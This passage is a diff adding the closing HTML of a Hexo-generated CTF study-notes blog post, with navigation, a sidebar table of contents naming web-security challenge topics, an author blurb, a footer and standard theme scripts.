+      <i class="fa fa-chevron-left"></i> ctf秀
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/04/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" rel="next" title="Dest0g3-520迎新赛">
+      Dest0g3-520迎新赛 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#echo-%E2%80%9C%E2%80%9C"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">echo ““;</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0"><span class="nav-number">2.</span> <span class="nav-text">做题笔记</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#thinkphp-5-0-22"><span class="nav-number"></span> <span class="nav-text">thinkphp 5.0.22</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number"></span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="nav-number"></span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件包含反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.</span> <span class="nav-text">php伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf-web%E8%A7%86%E9%A2%91%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">ctf web视频知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.1.</span> <span class="nav-text">报错注入原理与利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.0.2.</span> <span class="nav-text">1.联合查询</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#buuoj-web"><span class="nav-number">4.</span> <span class="nav-text">buuoj web</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#buuoj-web2"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">buuoj web2</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#web4"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#web5"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#web7"><span class="nav-number">4.0.0.4.</span> <span class="nav-text">web7</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="N9-zqc"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">N9-zqc</p>
+  <div class="site-description" itemprop="description">主要有关ctf的学习笔记,主攻逆向和Web</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N9-zqc</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
